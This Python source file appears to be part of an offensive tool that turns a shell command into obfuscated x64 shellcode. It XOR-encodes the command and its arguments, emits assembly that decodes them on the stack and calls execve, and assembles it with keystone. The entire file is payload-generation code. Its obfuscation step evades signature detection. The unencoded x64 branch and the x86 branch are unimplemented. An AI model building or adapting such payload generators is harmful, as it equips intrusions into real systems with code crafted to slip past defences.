from keystone import *
import struct
from .utils import sanitize_command
from .parseUserInput import *
def encode_string(s: str, xor_key: int = 0x00) -> tuple[list[int], int]:
    """
    Encode une chaîne en valeurs numériques XORées.
    Retourne les valeurs encodées et la longueur.
    """
    # Padding à 8 bytes
    padded = s.encode() + b'\x00' * (8 - (len(s) % 8))
    length = len(s)
    
    # XOR chaque byte
    encoded = [b ^ xor_key for b in padded]
    
    # Convertir en valeurs 64-bits
    values = []
    for i in range(0, len(encoded), 8):
        chunk = encoded[i:i+8]
        value = int.from_bytes(bytes(chunk), 'little')
        values.append(value)
    
    return values, length





def generate_shellcode(parsedCommandList: list[str], arch: str = 'x64', xor_key: int = 0x00) -> bytes:
    """
    Generates shellcode from a shell command.
    
    Args:
        command: The command to execute
        arch: Target architecture ('x86' or 'x64')
        xor_key: XOR key for obfuscation
    
    Returns:
        bytes: The generated shellcode
    """
    accumulatedSize = 0
    listArguments = setupToShellcode(parsedCommandList, xor_key)
    print("[+] Liste des arguments : ", listArguments)
    totalSize = 0
    for i in listArguments:
        totalSize += i[0]
    print("[+] Taille totale : ", totalSize)
    if arch == 'x64':
        if xor_key == 0x00:
            pass
        else:
            # Start of shellcode
            asm = """
            bits 64
            
            initshellcode:
                xor rax, rax
                push rax            ; NULL terminator envp
            """

            # Add encoded values
            for value in reversed(listArguments[0][1]):
                print(f"[+] Value: {value}")
                asm += f"""
                mov rdi, {hex(value)}   ; Encoded command part
                push rdi
                """
            asm += """
                ;mov rdi, rsp        ; rdi = ptr to encoded command
                """

            # Add arguments here
            for i in range(1, len(listArguments)):
                for value in reversed(listArguments[i][1]):
                    print("[+] On passe au arguments apres la cmd")
                    print(f"[+] Value: {value}")
                    asm += f"""
                mov rsi, {hex(value)}   ; Encoded argument part
                push rsi
                    """
            
            asm += """
                mov rdi, rsp
                """

            asm += f"""
                xor rax, rax        ; counter for decoding
                jmp xorshellcode
                
            shellcodeExecution:
                xor rax, rax
                push rax            ; NULL
                mov rdx, rsp        ; rdx = envp
                add rdi, {8*(totalSize - listArguments[0][0])}
                """
            
            for i in range(len(listArguments)-1, 0, -1):
                accumulatedSize += listArguments[i][0]
            print(f"[+] accumulatedSize: {accumulatedSize}")
            for i in range(len(listArguments)-1, 0, -1):
                asm += f"""
                lea rsi, [rdi - {8*accumulatedSize}]
                push rsi
                """
                accumulatedSize -= listArguments[i][0]

            asm += f"""
                push rdi            ; ptr to command
                mov rsi, rsp        ; rsi = argv [command, NULL]
                mov al, 59          ; execve
                syscall
                
            xorshellcode:
                xor byte [rdi+rax], """
            
            asm += hex(xor_key)     # Add XOR key
            
            asm += """
                inc rax
                cmp rax, """
            
            asm += str(totalSize*8)      # Add command length
            
            asm += """
                jl xorshellcode
                jmp shellcodeExecution
            """
            
            print("ASM:")
            print(asm)

            # Assemble shellcode with keystone
            try:
                ks = Ks(KS_ARCH_X86, KS_MODE_64)
                encoding, count = ks.asm(asm)
                return bytes(encoding)
            except KsError as e:
                print(f"Assembly error: {e}")
                return None

    elif arch == 'x86':
        raise NotImplementedError("x86 is not supported for the moment")
    
    return None
